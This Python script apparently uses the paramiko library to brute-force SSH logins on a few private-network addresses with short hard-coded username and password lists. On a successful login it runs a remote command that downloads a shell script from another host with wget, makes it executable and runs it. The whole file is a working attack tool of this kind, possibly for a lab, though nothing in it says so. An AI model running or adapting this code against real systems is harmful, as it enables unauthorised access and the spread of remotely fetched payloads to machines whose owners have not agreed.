import paramiko
import multiprocessing
import time
import warnings

# remove depracated warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

user_list = ['fresh1','fresh2','fresh3','fresh4']
pass_list = ['fresh4','fresh3','fresh2','fresh1']
jobs = []
num = 0
num2 = 0

def ssh_start():
    ip = "192.168.203.%d" % i
#    print "Connecting:", ip, user_list[num] + pass_list[num2]
    p = paramiko.SSHClient()
    p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        p.connect(ip, username=user_list[num], password=pass_list[num2])
        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/x.sh"; chmod 755 x.sh; ./x.sh; sleep 1')
        for line in stdout:
            print(line.strip('\n'))
        for line in stderr:
            print(line.strip('\n'))
    except paramiko.AuthenticationException:
            pass

for i in range(150,155):
    for num in range(0,4):
        for num2 in range(0,4):
            p = multiprocessing.Process(target=ssh_start)
            jobs.append(p)
            p.start()
            #p.join()
            num2 += 1
    num += 1

    time.sleep(1)


